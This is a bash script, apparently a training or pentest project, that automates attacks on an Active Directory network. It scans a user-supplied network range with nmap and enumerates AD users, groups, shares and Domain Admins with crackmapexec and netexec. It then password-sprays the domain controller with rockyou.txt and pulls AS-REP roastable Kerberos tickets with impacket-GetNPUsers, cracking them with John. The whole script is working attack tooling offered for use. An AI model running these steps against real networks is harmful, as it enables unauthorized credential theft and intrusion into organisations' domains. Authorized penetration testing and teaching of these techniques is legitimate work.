#!/bin/bash
# Define Color Variables
# Format: Escape_Code[Style_Code;Foreground_Color_Code
YELLOW='\e[1;33m'
CYAN='\e[1;36m'
ORANGE='\e[38;5;208m'
BGreen='\033[1;32m'
MAGENTA='\e[1;35m'
NC='\e[0m' # No Color (Reset)


function APP_CHECK()
{
	sudo updatedb
	echo -e "${MAGENTA}_______________________________________________________________${NC}"
	for TOOL in masscan nmap crackmapexec
	do 
		CHECK=$(command -v $TOOL)
		if [ -z "$CHECK" ] #-z acts as zero 
		then
			echo 'The following tool is not installed:' $TOOL
			echo "_______________________________________"
			echo
			# FIXED: Added $ before {MAGENTA}
			echo -e "${MAGENTA}----Start the installation----${NC}"
			echo
			echo "_______________________________________"
			sudo apt-get install $TOOL -y &>/dev/null
		else
			echo 
			echo -e "${CYAN} - The following tool is installed: ${NC}" $TOOL
		fi
	done 
}
APP_CHECK


function PREPARE()
{
	#Make sure to add comments
	echo -e "${MAGENTA}_______________________________________________________________${NC}"
	echo
	read -p " - Enter Network range for scanning: " netrange
	echo
	read -p " - Enter Domain Controller name: " domname
	echo
	#Tell the user to insert AD creds, if he doesn't have, pressing skip will leave the variables empty
	read -p " - Enter AD username (press enter to skip): " aduser
	echo
	read -sp " - Enter AD password (press enter to skip): " adpass
	echo
	echo
	read -p " - Specify a name of a new folder to save all the data: " folder
	# FIXED: Added quotes and -p flag
	mkdir -p "$folder"
	
	#If the user press enter, the password list rockyou will be saved in the variable
	echo
	read -p " - Specify the password list to use (press enter to default): " paslist
	if [ -z "$paslist" ]
	then
		# FIXED: wordlist -> wordlists
		paslist='/usr/share/wordlists/rockyou.txt'
	fi
}
PREPARE


function SCAN()
{
	echo -e "${MAGENTA}_______________________________________________________________${NC}"
	echo 
	echo -e "${ORANGE}____SCAN_____B for basic scan, I for intermediate, A for advanced_____${NC}"
	echo
	read scantype
	
	#The scan level will be determined by the user
	case $scantype in
	
	B|b) extra_flags=''
	;;
	
	I|i) extra_flags='-p- --max-retries 2 --host-timeout 1m'
	;;
	
	A|a) extra_flags='-p- -sU --max-retries 2 --host-timeout 1m'
	;;
	
	# FIXED: Added *) wildcard option
	*) echo "Invalid option, using basic scan"
	   extra_flags=''
	;;
	
	esac
	#scan the netrange variable with the extra flags if exists
	nmap $netrange -Pn $extra_flags -oN $folder/nmap_output.txt
}
SCAN


function BasicEnum()
{
	grep "report for" "$folder/nmap_output.txt" | awk '{print $NF}' > "$folder/live_ips.txt"
	
	for ip in $(cat $folder/live_ips.txt)
	do
		nmap $ip -Pn -sV -oN $folder/$ip
	done 
	
	DomainIP=$(grep -il 'kerberos' $folder/[0-9]* | awk -F '/' '{print $2}') #grep and list the name of matching
	echo "The Domain IP is $DomainIP" 
	
	DHCPIP=$(nmap $DomainIP -sV --script=broadcast-dhcp-discover | grep "Server Identifier" | awk '{print $NF}')
	echo "The DHCP server IP is $DHCPIP" | tee $folder/dhcpip.txt
}


function InterEnum()
{
	nmap $DomainIP -sV --script=ldap-search,smb-enum-shares -oN $folder/domain_extended_scan.txt
	nmap $DomainIP -sV --script=ms-sql-info,smb-os-discovery -oN $folder/domain_extended_scan_DO.txt
	
	#For loop to find devices with the following ports
	for port in 21 22 445 5985 389 3389
	do
		echo "The following IPs include the port $port open" | tee -a $folder/open_key_ports.txt #tee -a will display the data that was injected to the file
		# FIXED: Added $ before port variable in regex
		grep -El "^$port/tcp[[:space:]]+open" $folder/[0-9]* | awk -F '/' '{print $2}' | tee -a $folder/open_key_ports.txt
		echo -e "${MAGENTA}____________________________________________________${NC}" | tee -a $folder/open_key_ports.txt
	done
}


function AdvEnum()
{
	if [ -z "$aduser" ] #If the AD user variable that was entered is empty. You can check the AD pass as well
	then 
		echo "Can't continue, AD creds are missing"
		return 1
	else #If it is not empty, run all the commands
		echo
		echo -e "${BGreen}[*] Enumerating AD users...${NC}"
		crackmapexec smb $DomainIP -u $aduser -p $adpass --users | grep 'badpwdcount' | awk '{print $5}' | awk -F '\\' '{print $2}' > $folder/adusers.txt
		
		echo -e "${BGreen}[*] Enumerating AD groups...${NC}"
		crackmapexec smb $DomainIP -u $aduser -p $adpass --groups | grep -v "SMB" | grep -v "\\[" | awk -F '\\' '{print $NF}' | grep -v "^$" | sort -u > $folder/adgroups.txt
		
		echo -e "${BGreen}[*] Enumerating AD shares...${NC}"
		crackmapexec smb $DomainIP -u $aduser -p $adpass --shares | grep -E "READ|WRITE" | awk '{print $4}' | sort -u > $folder/adshares.txt
		
		echo -e "${BGreen}[*] Getting password policy...${NC}"
		crackmapexec smb $DomainIP -u $aduser -p $adpass --pass-pol | grep -E "Minimum|Maximum|Lockout|Complexity" > $folder/adpasspolicy.txt
		
		echo -e "${BGreen}[*] Finding Domain Admins...${NC}"
		crackmapexec smb $DomainIP -u $aduser -p $adpass --groups 'Domain Admins' | grep -v "SMB" | grep -v "\\[" | awk -F '\\' '{print $NF}' | grep -v "^$" > $folder/domain_admins.txt
		
		#the following commands are used with netexec to display disabled users and never expired accounts
		echo -e "${BGreen}[*] Finding disabled users...${NC}"
		netexec ldap $DomainIP -u $aduser -p $adpass --query "(userAccountControl:1.2.840.113556.1.4.803:=2)" sAMAccountName 2>/dev/null | grep -v "LDAP" | awk '{print $NF}' > $folder/disabledusers.txt
		
		echo -e "${BGreen}[*] Finding never-expiring accounts...${NC}"
		netexec ldap $DomainIP -u $aduser -p $adpass --query "(|(accountExpires=0)(accountExpires=9223372036854775807))" sAMAccountName 2>/dev/null | grep -v "LDAP" | awk '{print $NF}' > $folder/neverexpires.txt
	fi
}


function ENUM()
{
	echo
	echo -e "${ORANGE}_____ENUM_____B for Basic scan, I for Intermediate, A for Advanced_____${NC}"
	echo
	read enumtype
	
	#The scan level will be determined by the user
	case $enumtype in
	
	B|b) BasicEnum
	;;
	
	I|i) BasicEnum
		 InterEnum
	;;
	
	A|a) BasicEnum
		 InterEnum
		 AdvEnum
	;;
	
	# FIXED: Added *) wildcard option
	*) echo "Invalid option, running basic enumeration"
	   BasicEnum
	;;
	
	esac
}	
ENUM


function EXPLOIT()
{
	echo
	echo -e "${ORANGE}_____EXPLOIT_____B for Basic, I for Intermediate, A for Advanced_____${NC}"
	echo
	if ! read exploittype < /dev/tty; then
    echo "[!] No input available, skipping exploit stage"
    return 0
fi
	
	case $exploittype in 
	
	B|b) echo -e "${CYAN}Starting Basic Exploit{NC}"
	;;
	
	I|i)
		if [ -f $folder/adusers.txt ] 
		then
			echo -e "${CYAN}[*] Starting password spraying attack...${NC}"
			# FIXED: smd -> smb, gerp -> grep
			crackmapexec smb $DomainIP -u $folder/adusers.txt -p $paslist -d $domname --continue-on-success | grep '+' >> $folder/pass-attack_results.txt
		else
			echo "No user file was found"
		fi
	;;
	
	A|a)
		if [ -f $folder/adusers.txt ] 
		then
			echo
			echo -e "${CYAN}[*] Starting password spraying attack...${NC}"
			echo
			crackmapexec smb $DomainIP -u $folder/adusers.txt -p $paslist -d $domname --continue-on-success | grep '+' >> $folder/pass-attack_results.txt
			
			#get the tickets of npusers, crack the tickets using john
			echo -e "${CYAN}[*] Getting Kerberos tickets...${NC}"
			echo
			impacket-GetNPUsers $domname/ -usersfile $folder/adusers.txt -dc-ip $DomainIP > $folder/npusers_tickets.txt
			
			if [ -s $folder/npusers_tickets.txt ]; then
				echo -e "${CYAN}[*] Cracking tickets with John...${NC}"
				echo
				# FIXED: paslists -> paslist
				john $folder/npusers_tickets.txt --format=krb5asrep --wordlist=$paslist
				john $folder/npusers_tickets.txt --format=krb5asrep --show > $folder/cracked_npusers.txt
			else
				echo "[!] No vulnerable users found"
			fi
		else
			echo "No user file was found"
		fi
	;;
	
	# FIXED: Added *) wildcard option
	*) echo "Invalid option"
	;;
	
	esac
	echo
	echo -e "${CYAN}[*] Running vulnerability scan...${NC}"
	echo
	nmap $DomainIP -sV --script=vuln --host-timeout 5m --max-retries 2 -n -oN $folder/domain-vulns.txt	
}
EXPLOIT


function PDF()
{
	echo
	echo -e "${CYAN}[*] Generating PDF report...${NC}"
	echo
	if ! command -v enscript &> /dev/null; then
		echo "[*] Installing enscript..."
		sudo apt-get install enscript -y
	fi
	
	# FIXED: Added .ps extension
	enscript $folder/nmap_output.txt -p $folder/output.ps
	ps2pdf $folder/output.ps $folder/output.pdf
	echo
	echo -e "${BGreen}[✓] PDF file created: $folder/output.pdf${NC}"
	# FIXED: Remove .ps file
	rm $folder/output.ps
}
PDF
